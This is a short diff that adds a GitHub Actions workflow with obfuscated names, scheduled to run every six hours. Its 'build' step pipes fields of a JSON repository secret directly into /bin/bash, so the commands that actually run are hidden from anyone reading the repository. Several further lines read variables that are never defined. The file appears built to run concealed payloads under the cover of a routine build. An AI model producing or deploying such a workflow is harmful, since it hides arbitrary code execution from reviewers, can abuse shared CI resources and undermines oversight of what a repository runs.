@@ -1,0 +1,22 @@
+name: makezhu9381
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: makezhu9381
+        env:
+          gxy91: ${{ secrets.gxy91 }}
+        run: |
+          echo $gxy91 | jq -r .l21 | /bin/bash
+          echo $y21 | jq -r .qzon919 | /bin/bash
+          echo $st27 | jq -r .sx6551 | /bin/bash
+          echo $h8 | jq -r .grzgl2999 | /bin/bash
+          echo $rxdr51 | jq -r .pkz13 | /bin/bash
+
